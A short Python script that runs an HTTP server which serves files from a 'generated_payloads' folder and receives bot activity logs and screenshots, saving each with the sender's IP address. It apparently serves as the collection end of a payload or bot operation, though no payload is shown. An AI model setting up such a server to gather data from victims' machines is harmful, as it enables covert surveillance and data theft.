#!/usr/bin/env python3

import http.server
import socketserver
import os
import subprocess
from urllib.parse import parse_qs

class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.path = '/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
    
    def do_POST(self):
        if self.path == '/log':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            
            # Log the data
            with open('bot_activity.log', 'a') as f:
                f.write(f"{self.client_address[0]}: {post_data.decode('utf-8')}\n")
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Logged')
        elif self.path == '/screenshot':
            # Handle screenshot upload
            content_length = int(self.headers['Content-Length'])
            image_data = self.rfile.read(content_length)
            
            # Save the screenshot
            timestamp = subprocess.check_output(['date', '+%Y%m%d%H%M%S']).decode('utf-8').strip()
            with open(f'screenshots/{timestamp}_{self.client_address[0]}.png', 'wb') as f:
                f.write(image_data)
            
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Screenshot saved')
        
        return

PORT = 8080
os.chdir('generated_payloads')
os.makedirs('screenshots', exist_ok=True)

with socketserver.TCPServer(("", PORT), PayloadHandler) as httpd:
    print(f"Payload server running at port {PORT}")
    httpd.serve_forever()
